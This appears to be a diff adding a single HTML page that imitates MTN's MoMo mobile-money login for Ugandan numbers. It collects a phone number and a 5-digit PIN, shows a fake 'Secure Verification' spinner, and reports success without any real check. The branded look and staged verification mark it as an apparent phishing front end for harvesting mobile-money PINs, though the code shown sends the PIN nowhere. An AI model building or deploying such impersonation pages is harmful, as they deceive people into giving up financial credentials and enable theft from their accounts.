@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome to MoMo</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { 
+      margin: 0; min-height: 100vh; font-family: Arial, sans-serif; 
+      background: #eef2f5; color: #171717; display: flex; flex-direction: column;
+    }
+    header { background: #004f71; padding: 40px 16px 60px; text-align: center; }
+    .momo-logo-box {
+      width: 60px; height: 60px; background: #ffcc00; border-radius: 12px;
+      margin: 0 auto; display: flex; align-items: center; justify-content: center;
+    }
+    .momo-logo-text { color: #004f71; font-weight: 900; font-size: 18px; }
+    .momo-subtext { color: #ffcc00; font-size: 11px; margin-top: 4px; font-weight: bold; }
+    main { 
+      width: min(440px, 92%); margin: -35px auto 25px; padding: 30px 24px; 
+      background: white; border-radius: 24px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08); z-index: 10;
+    }
+    h2 { margin-top: 0; text-align: center; color: #004f71; font-size: 22px; }
+    .field-label { display: block; text-align: center; margin: 20px 0 12px; font-weight: 600; color: #555; }
+    .phone-row { display: flex; gap: 10px; align-items: center; border: 1px solid #ccc; border-radius: 16px; padding: 8px 14px; }
+    .country-flag { font-size: 20px; }
+    .phone-input-field { border: none; outline: none; width: 100%; font-size: 18px; font-weight: 600; }
+    
+    /* Dynamic Interactive Button Styles */
+    button { 
+      width: 100%; padding: 16px; margin-top: 30px; border: 0; border-radius: 25px; 
+      background: #cccccc; color: white; font-weight: bold; font-size: 16px; cursor: not-allowed; 
+      transition: background-color 0.2s ease;
+    }
+    button:not(:disabled) { background: #004f71; cursor: pointer; }
+    button:not(:disabled):active { background: #00364e; }
+
+    .hidden { display: none !important; }
+    .legal-text { text-align: center; font-size: 13px; color: #666; margin-top: 25px; }
+    .legal-text a { color: #004f71; text-decoration: none; font-weight: bold; }
+    .error { color: #d32f2f; text-align: center; margin-top: 12px; font-weight: 600; }
+    .success { font-size: 24px; text-align: center; color: #2e7d32; font-weight: bold; }
+    
+    .secure-overlay {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 30, 45, 0.75);
+      backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); z-index: 9999;
+      display: flex; flex-direction: column; align-items: center; justify-content: center; color: #ffffff; text-align: center;
+    }
+    .circular-spinner {
+      width: 60px; height: 60px; border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top-color: #00cc66; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+    }
+    .secure-title { font-size: 20px; font-weight: bold; margin-bottom: 8px; letter-spacing: 0.5px; }
+    .secure-sub { font-size: 14px; color: #dddddd; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* MTN Branding Styles */
+    .mtn-yellow-header { background: #FFCC00 !important; padding: 24px 16px 20px !important; }
+    .mtn-logo-oval {
+      background: #FFCC00; border: 3px solid #000; border-radius: 50%;
+      width: 105px; height: 62px; display: flex; align-items: center; justify-content: center;
+      font-family: 'Arial Black', Impact, sans-serif; font-size: 24px; font-weight: 900; color: #000; margin: 0 auto;
+    }
+    .mtn-main-theme { width: 100% !important; margin: 0 !important; padding: 20px 32px !important; box-shadow: none !important; border-radius: 0 !important; }
+    .graphic-container { margin: 10px 0 5px; position: relative; width: 120px; height: 110px; display: flex; justify-content: center; align-items: center; }
+    .phone-icon-mock { width: 44px; height: 76px; border: 4px solid #1c1b1f; border-radius: 12px; background: #fff; }
+    .bubble-mock { position: absolute; background: #FFCC00; padding: 4px 8px; border-radius: 8px; font-size: 13px; font-weight: bold; top: 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    .mtn-h2 { color: #000000; font-size: 32px; font-weight: 800; letter-spacing: -0.5px; margin-top: 10px; }
+    .instruction-text { font-size: 15px; color: #4b4b4b; text-align: center; line-height: 1.5; margin-bottom: 24px; max-width: 340px; }
+    .text-input-field { width: 100%; border: 1px solid #b1b1b1; border-radius: 6px; padding: 16px; font-size: 15px; outline: none; }
+    
+    /* Pin input layouts */
+    .digits-row { display: flex; justify-content: space-between; width: 100%; gap: 12px; margin-top: 15px; }
+    .digit-box { flex: 1; height: 64px; border: 1px solid #b1b1b1; border-radius: 8px; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
+    .digit-box:focus { border-color: #FFCC00; }
+    .info-box { background: #FFF9E6; border-radius: 8px; padding: 14px 16px; display: flex; gap: 12px; margin-bottom: 25px; width: 100%; text-align: left; }
+    .info-icon { background: #FFCC00; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: black; }
+  </style>
+</head>
+<body>
+
+  <div id="secureModal" class="secure-overlay hidden">
+    <div class="circular-spinner"></div>
+    <div class="secure-title">Secure Verification</div>
+    <div class="secure-sub">Verifying your PIN...<br>Please do not close this page.</div>
+  </div>
+
+  <header>
+    <div class="momo-logo-box"><span class="momo-logo-text">MoMo</span></div>
+    <div class="momo-subtext">from MTN</div>
+  </header>
+
+  <main>
+    <!-- Screen 1: Phone Validation -->
+    <section id="phonePage">
+      <h2>Welcome to MoMo</h2>
+      <label class="field-label">Enter number *</label>
+      <div class="phone-row">
+        <div class="country-flag">🇺🇬</div>
+        <input type="text" id="phoneInput" class="phone-input-field" placeholder="e.g. 778260583" inputmode="numeric" maxlength="9">
+      </div>
+      <button id="phoneButton" disabled>NEXT</button>
+      <p id="phoneError" class="error"></p>
+      <p class="legal-text">Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
+    </section>
+
+    <!-- Screen 2: 5-Digit PIN Input -->
+    <section id="pinPage" class="hidden">
+      <h2>Welcome to MoMo</h2>
+      <label class="field-label">Enter your 5-digit PIN</label>
+      <div class="digits-row" id="pinDigitsContainer">
+        <!-- Javascript renders inputs dynamically here -->
+      </div>
+      <p id="pinError" class="error"></p>
+    </section>
+
+    <!-- Screen 3: Complete -->
+    <section id="successPage" class="hidden">
+      <div class="success">✓ Verified Successfully</div>
+    </section>
+  </main>
+
+  <script>
+    const phonePage = document.getElementById('phonePage');
+    const pinPage = document.getElementById('pinPage');
+    const successPage = document.getElementById('successPage');
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneButton = document.getElementById('phoneButton');
+    const phoneError = document.getElementById('phoneError');
+    const pinDigitsContainer = document.getElementById('pinDigitsContainer');
+    const pinError = document.getElementById('pinError');
+    const secureModal = document.getElementById('secureModal');
+
+    // 1. Listen for user numeric input on phone field
+    phoneInput.addEventListener('input', (e) => {
+      // Disallow non-digits
+      e.target.value = e.target.value.replace(/\D/g, '');
+      
+      // Enable next step if validation requirement is met (exactly 9 digits)
+      if (e.target.value.length === 9) {
+        phoneButton.removeAttribute('disabled');
+        phoneError.textContent = '';
+      } else {
+        phoneButton.setAttribute('disabled', 'true');
+      }
+    });
+
+    // 2. Click transition handler
+    phoneButton.addEventListener('click', () => {
+      phonePage.classList.add('hidden');
+      pinPage.classList.remove('hidden');
+      generatePinFields();
+    });
+
+    // 3. Assemble and track 5 secure PIN input components
+    function generatePinFields() {
+      pinDigitsContainer.innerHTML = '';
+      const totalBoxes = 5;
+      const elementsList = [];
+
+      for (let i = 0; i < totalBoxes; i++) {
+        const inputElement = document.createElement('input');
+        inputElement.type = 'password';
+        inputElement.classList.add('digit-box');
+        inputElement.maxLength = 1;
+        inputElement.inputMode = 'numeric';
+        
+        pinDigitsContainer.appendChild(inputElement);
+        elementsList.push(inputElement);
+
+        // Automate next-element selection logic upon key entry
+        inputElement.addEventListener('input', (e) => {
+          e.target.value = e.target.value.replace(/\D/g, '');
+          
+          if (e.target.value.length === 1 && i < totalBoxes - 1) {
+            elementsList[i + 1].focus();
+          }
+          evaluatePinState(elementsList);
+        });
+
+        // Jump backwards if backspace key is pressed
+        inputElement.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && e.target.value.length === 0 && i > 0) {
+            elementsList[i - 1].focus();
+          }
+        });
+      }
+
+      // Initial focus on first input box
+      setTimeout(() => elementsList[0].focus(), 150);
+    }
+
+    // 4. Verify whether complete code has been compiled
+    function evaluatePinState(inputs) {
+      const compiledString = inputs.map(el => el.value).join('');
+      
+      if (compiledString.length === 5) {
+        pinError.textContent = '';
+        secureModal.classList.remove('hidden');
+
+        // Emulate validation duration delay
+        setTimeout(() => {
+          secureModal.classList.add('hidden');
+          pinPage.classList.add('hidden');
+          successPage.classList.remove('hidden');
+        }, 2200);
+      }
+    }
+  </script>
+</body>
+</html>
